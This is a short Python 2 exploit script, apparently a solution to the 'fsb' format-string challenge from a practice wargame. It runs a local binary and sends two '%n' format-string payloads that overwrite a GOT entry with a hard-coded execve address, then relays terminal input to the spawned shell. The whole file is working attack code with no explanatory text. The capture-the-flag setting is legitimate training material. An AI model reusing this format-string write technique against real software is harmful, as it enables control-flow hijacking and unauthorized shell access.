import subprocess
import pty
import os
import fcntl
import time

master, slave = pty.openpty()

p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/fsb/fsb"], stdin=subprocess.PIPE, stdout=slave)

p.stdout = os.fdopen(os.dup(master), 'r+')

read_plt_address = 0x0804a000
execve_fsb_address = 0x0804869f

p.stdout.readline()

p.stdin.write('%{0}x%14$n'.format(read_plt_address))

p.stdout.readline()

p.stdin.write('%{0}x%20$n'.format(execve_fsb_address))

p.stdout.readline()

fd = p.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)


while(True):
	try:
		time.sleep(0.1)
		print p.stdout.read()
	except:
		p.stdin.write(raw_input() + '\n')

